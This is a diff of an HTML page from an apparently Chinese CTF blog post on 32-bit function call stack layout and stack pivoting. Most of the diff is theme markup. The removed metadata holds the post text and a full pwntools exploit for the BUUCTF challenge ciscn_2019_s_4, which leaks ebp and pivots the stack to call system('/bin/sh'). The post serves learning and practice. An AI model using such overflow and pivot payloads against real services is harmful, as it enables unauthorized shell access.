@@ -1,546 +1,424 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="auto">
+<html lang="zh-CN">
 
-<head><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
-<title>[PWN.0x00]函数调用栈结构与栈迁移 | zeroy&#39;s blog</title>
-<meta name="keywords" content="" />
-<meta name="description" content="前置知识：汇编语言（第4版）前半本
- 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret
- 函数调用栈的基本结构 一些寄存器的作用：
-EIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。
-EBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。
-ESP：始终指向栈顶。
-在进入一个函数时，会执行如下操作。
-push eip&#43;4push ebpmov ebp,esp在执行完退出时，会执行如下操作。
-mov esp,ebppop ebppop eip即leave和ret。
-整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip&#43;4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。
-函数调用栈工作时的结构如下图：
-其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如：
-void func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。
-考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。
-但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。
-栈迁移 栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。
-也就是说，要构造栈中数据如图所示：
-至于为什么要-4，后面模拟的过程中读者自能体会。
-好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图：
-然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图：
-这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。
-例题：ciscn_2019_s_4 BUUCTF在线评测 (buuoj.cn)
-所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。
-惯例checksec，只开了NX。
-ida分析得到：
-int vul() { char buf[40]; // [esp&#43;0h] [ebp-28h] BYREF  memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(&#34;Hello, %s\n&#34;, buf); read(0, buf, 0x30u); return printf(&#34;Hello, %s\n&#34;, buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。">
-<meta name="author" content="zeroy">
-<link rel="canonical" href="https://zeroy.site/articles/CTFpwn1/" />
-<link crossorigin="anonymous" href="/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css" integrity="sha256-yIlj/i15RiAA/Q&#43;xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as="style">
-<script defer crossorigin="anonymous" src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
-    onload="hljs.initHighlightingOnLoad();"></script>
-<link rel="icon" href="https://zeroy.site/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://zeroy.site/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://zeroy.site/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://zeroy.site/apple-touch-icon.png">
-<link rel="mask-icon" href="https://zeroy.site/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<meta name="generator" content="Hugo 0.92.0" />
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --theme: rgb(29, 30, 32);
-                --entry: rgb(46, 46, 51);
-                --primary: rgb(218, 218, 219);
-                --secondary: rgb(155, 156, 157);
-                --tertiary: rgb(65, 66, 68);
-                --content: rgb(196, 196, 197);
-                --hljs-bg: rgb(46, 46, 51);
-                --code-bg: rgb(55, 56, 62);
-                --border: rgb(51, 51, 51);
-            }
-
-            .list {
-                background: var(--theme);
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
-            }
-        }
-
-    </style>
-</noscript><meta property="og:title" content="[PWN.0x00]函数调用栈结构与栈迁移" />
-<meta property="og:description" content="前置知识：汇编语言（第4版）前半本
- 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret
- 函数调用栈的基本结构 一些寄存器的作用：
-EIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。
-EBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。
-ESP：始终指向栈顶。
-在进入一个函数时，会执行如下操作。
-push eip&#43;4push ebpmov ebp,esp在执行完退出时，会执行如下操作。
-mov esp,ebppop ebppop eip即leave和ret。
-整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip&#43;4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。
-函数调用栈工作时的结构如下图：
-其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如：
-void func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。
-考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。
-但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。
-栈迁移 栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。
-也就是说，要构造栈中数据如图所示：
-至于为什么要-4，后面模拟的过程中读者自能体会。
-好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图：
-然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图：
-这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。
-例题：ciscn_2019_s_4 BUUCTF在线评测 (buuoj.cn)
-所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。
-惯例checksec，只开了NX。
-ida分析得到：
-int vul() { char buf[40]; // [esp&#43;0h] [ebp-28h] BYREF  memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(&#34;Hello, %s\n&#34;, buf); read(0, buf, 0x30u); return printf(&#34;Hello, %s\n&#34;, buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。" />
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>[PWN.0x00]函数调用栈结构与栈迁移 - zeroy的网络小窝</title><meta name="Description" content="zeroy的碎碎念"><meta property="og:title" content="[PWN.0x00]函数调用栈结构与栈迁移" />
+<meta property="og:description" content="前置知识：汇编语言（第4版）前半本 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://zeroy.site/articles/CTFpwn1/" /><meta property="article:section" content="articles" />
-<meta property="article:published_time" content="2022-03-05T20:30:31&#43;08:00" />
-<meta property="article:modified_time" content="2022-03-05T20:30:31&#43;08:00" />
+<meta property="og:url" content="http://zeroy.site/articles/CTFpwn1/" /><meta property="og:image" content="http://zeroy.site/ava.jpeg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-05T20:30:31+08:00" />
+<meta property="article:modified_time" content="2022-03-05T20:30:31+08:00" /><meta property="og:site_name" content="zeroy的网络小窝" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://zeroy.site/ava.jpeg"/>
 
-<meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="[PWN.0x00]函数调用栈结构与栈迁移"/>
-<meta name="twitter:description" content="前置知识：汇编语言（第4版）前半本
- 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret
- 函数调用栈的基本结构 一些寄存器的作用：
-EIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。
-EBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。
-ESP：始终指向栈顶。
-在进入一个函数时，会执行如下操作。
-push eip&#43;4push ebpmov ebp,esp在执行完退出时，会执行如下操作。
-mov esp,ebppop ebppop eip即leave和ret。
-整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip&#43;4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。
-函数调用栈工作时的结构如下图：
-其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如：
-void func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。
-考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。
-但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。
-栈迁移 栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。
-也就是说，要构造栈中数据如图所示：
-至于为什么要-4，后面模拟的过程中读者自能体会。
-好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图：
-然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图：
-这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。
-例题：ciscn_2019_s_4 BUUCTF在线评测 (buuoj.cn)
-所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。
-惯例checksec，只开了NX。
-ida分析得到：
-int vul() { char buf[40]; // [esp&#43;0h] [ebp-28h] BYREF  memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(&#34;Hello, %s\n&#34;, buf); read(0, buf, 0x30u); return printf(&#34;Hello, %s\n&#34;, buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。"/>
+<meta name="twitter:description" content="前置知识：汇编语言（第4版）前半本 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色"/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
 
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://zeroy.site/articles/CTFpwn1/" /><link rel="prev" href="http://zeroy.site/articles/noya/" /><link rel="next" href="http://zeroy.site/articles/CTFpwn2/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Articles",
-      "item": "https://zeroy.site/articles/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "[PWN.0x00]函数调用栈结构与栈迁移",
-      "item": "https://zeroy.site/articles/CTFpwn1/"
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[PWN.0x00]函数调用栈结构与栈迁移",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/zeroy.site\/articles\/CTFpwn1\/"
+        },"genre": "posts","wordcount":  1629 ,
+        "url": "http:\/\/zeroy.site\/articles\/CTFpwn1\/","datePublished": "2022-03-05T20:30:31+08:00","dateModified": "2022-03-05T20:30:31+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "zeroy"
+            },"description": ""
     }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "[PWN.0x00]函数调用栈结构与栈迁移",
-  "name": "[PWN.0x00]函数调用栈结构与栈迁移",
-  "description": "前置知识：汇编语言（第4版）前半本\n 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret\n 函数调用栈的基本结构 一些寄存器的作用：\nEIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。\nEBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。\nESP：始终指向栈顶。\n在进入一个函数时，会执行如下操作。\npush eip+4\rpush ebp\rmov ebp,esp\r在执行完退出时，会执行如下操作。\nmov esp,ebp\rpop ebp\rpop eip\r即leave和ret。\n整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip+4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。\n函数调用栈工作时的结构如下图：\n其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如：\nvoid func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。\n考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。\n但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。\n栈迁移 栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。\n也就是说，要构造栈中数据如图所示：\n至于为什么要-4，后面模拟的过程中读者自能体会。\n好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图：\n然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图：\n这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。\n例题：ciscn_2019_s_4 BUUCTF在线评测 (buuoj.cn)\n所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。\n惯例checksec，只开了NX。\nida分析得到：\nint vul() { char buf[40]; // [esp+0h] [ebp-28h] BYREF  memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(\u0026#34;Hello, %s\\n\u0026#34;, buf); read(0, buf, 0x30u); return printf(\u0026#34;Hello, %s\\n\u0026#34;, buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。",
-  "keywords": [
-    
-  ],
-  "articleBody": "前置知识：汇编语言（第4版）前半本\n 注：本文适用于32位程序，示意图中上为高地址区，下为低地址区。若方框中字体为蓝色表示此处内存的地址，为黑色表示此处内存存储的值。示意图中leave均表示leave|ret\n 函数调用栈的基本结构 一些寄存器的作用：\nEIP：存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。\nEBP：存储着当前函数栈底的地址，通过将其与偏移地址相加减获取变量的地址。\nESP：始终指向栈顶。\n在进入一个函数时，会执行如下操作。\npush eip+4\rpush ebp\rmov ebp,esp\r在执行完退出时，会执行如下操作。\nmov esp,ebp\rpop ebp\rpop eip\r即leave和ret。\n整个过程描述起来就是，先将函数执行完成之后应当去执行的语句（eip+4）和主程序的的基址（ebp）压入栈中，然后再将ebp指向栈底。在函数执行完之后，再进行一遍上述过程的逆过程。\n函数调用栈工作时的结构如下图：\n其中val0地址处存储主程序传入的参数，如果有多个传入参数，它们将按照从右到左的顺序被push入栈中，val1~3为函数申请的局部变量。它们将按照申请的顺序被放入栈中。举例来讲，形如：\nvoid func(int a){ int b,c; char s[10]; } 这样的函数，a将被存入val0，b将被存入val1，c将被存入val2，s将被存入val3。\n考虑最基础的栈溢出题目，由于程序将按照地址从低到高的顺序存储字符串变量，所以当s的数据由选手掌控且溢出空间足够大时，s将溢出到val2，val3，甚至旧ebp，eip的位置上。所以选手就可以控制旧ebp，eip处的内容，实现劫持程序返回，让程序执行恶意代码的目的。\n但有时候，选手能掌控的数据量很有限，不足以支持我们完成过于复杂的劫持指令，对于这种情况，其中一种解题方法就是栈迁移。\n栈迁移 栈迁移的核心思想是劫持当前函数已经压入栈中的eip段，将其内容改为一次leave，同时修改旧ebp段，借助旧ebp为跳板，实现对esp的控制，进而在下一次ret中，修改eip的值，实现目的。\n也就是说，要构造栈中数据如图所示：\n至于为什么要-4，后面模拟的过程中读者自能体会。\n好了，现在当前函数已经执行完了，程序将自行执行一次leave和ret。执行之后的结果如图：\n然后程序会执行eip指向的地址的命令，即再执行一次leave，ret，执行后栈的情况如图：\n这样我们就完成了借助ebp为跳板，将esp指向目标eip的位置，控制程序在最后一次ret（即pop eip）的时候，将eip赋值成了我们想让它执行的函数的地址。\n例题：ciscn_2019_s_4 BUUCTF在线评测 (buuoj.cn)\n所谓“从零开始的Pwner生活”第一题，差点直接给我整劝退。\n惯例checksec，只开了NX。\nida分析得到：\nint vul() { char buf[40]; // [esp+0h] [ebp-28h] BYREF  memset(buf, 0, 0x20u); read(0, buf, 0x30u); printf(\"Hello, %s\\n\", buf); read(0, buf, 0x30u); return printf(\"Hello, %s\\n\", buf); } 发现只有8个字节的溢出空间，不足以支持一次完整的ROP，但是可以读两次，且第一次读入有输出，因此可以利用第一次读入来泄露ebp（注：这里的ebp指的是vul函数的ebp，即read函数栈帧中的旧ebp）。\n第一次读满0x28个字节，由于printf输出的时候会一直输出到\\x00为止，所以会把ebp也一起输出来。\n在第二次输入的时候构造一个栈迁移的结构，将栈迁移到我们能控制的buf段。\n结合文章开头函数调用栈的知识，不难理解，‘bin/sh’和buf_addr+12都将作为输入的参数输入到system函数中，所以程序最终执行的效果就是获取了shell。\n注意到我们需要填入的信息中需要我们预先知道buf的地址，可以在本地动态调试（gdb）中获取ebp和buf地址的差值，然后作差得到。不要想当然地认为buf和ebp的差值就是0x28，这只是在read函数中的情况，此处的ebp指的是vul函数中的ebp，即read函数中ebp指向的oldebp。\nEXP：\nfrom psutil import process_iter from pwn import * context(arch=\"i386\",log_level=\"debug\") op=0 e=ELF(\"ciscn-s-4.bin\") sys_addr=e.symbols['system'] leave_addr=0x080484B8 def main(): if op==1: zeroy=process(\"ciscn-s-4.bin\") else: zeroy=remote(\"node4.buuoj.cn\",27827) payload1=b'a'*0x24+b\"bbbb\" zeroy.recvuntil(\"name?\") zeroy.send(payload1) zeroy.recvuntil(\"bbbb\") ebp_addr=u32(zeroy.recv(4)) print(\"ebp_addr: \",hex(ebp_addr)) buf_addr=ebp_addr-0x38 payload2=p32(sys_addr)+b'aaaa'+p32(buf_addr+12)+b'/bin/sh\\x00' payload2=payload2.ljust(0x28,b'a')+p32(buf_addr-4)+p32(leave_addr) zeroy.send(payload2) zeroy.interactive() main() ",
-  "wordCount" : "115",
-  "inLanguage": "zh-cn",
-  "datePublished": "2022-03-05T20:30:31+08:00",
-  "dateModified": "2022-03-05T20:30:31+08:00",
-  "author":{
-    "@type": "Person",
-    "name": "zeroy"
-  },
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://zeroy.site/articles/CTFpwn1/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "zeroy's blog",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://zeroy.site/favicon.ico"
-    }
-  }
-}
-</script>
+    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
 </head>
 
-<body class="" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="https://zeroy.site/" accesskey="h" title="zeroy&#39;s blog (Alt + H)">zeroy&#39;s blog</a>
-            <span class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                </button>
-            </span>
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="zeroy的网络小窝"><img
+        class="logo"
+        loading="lazy"
+        src="/ava.jpeg"
+        srcset="/ava.jpeg, /ava.jpeg 1.5x, /ava.jpeg 2x"
+        sizes="auto"
+        alt="/ava.jpeg"
+        title="/ava.jpeg" >zeroy的网络小窝</a>
         </div>
-        <ul id="menu">
-            <li>
-                <a href="https://zeroy.site/" title="首页">
-                    <span>首页</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://zeroy.site/archives/" title="归档">
-                    <span>归档</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://zeroy.site/categories/" title="分类">
-                    <span>分类</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://zeroy.site/about/" title="关于">
-                    <span>关于</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://zeroy.site/search/" title="搜索 (Alt &#43; /)" accesskey=/>
-                    <span>搜索</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://zeroy.site/links/" title="友链">
-                    <span>友链</span>
-                </a>
-            </li>
-        </ul>
-        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=80 src="//music.163.com/outchain/player?type=2&id=415904308&auto=1&height=66"></iframe>
-    </nav>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="zeroy的网络小窝"><img
+        class="logo"
+        loading="lazy"
+        src="/ava.jpeg"
+        srcset="/ava.jpeg, /ava.jpeg 1.5x, /ava.jpeg 2x"
+        sizes="auto"
+        alt="/ava.jpeg"
+        title="/ava.jpeg" >zeroy的网络小窝</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about" title="">关于</a><a href="#" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
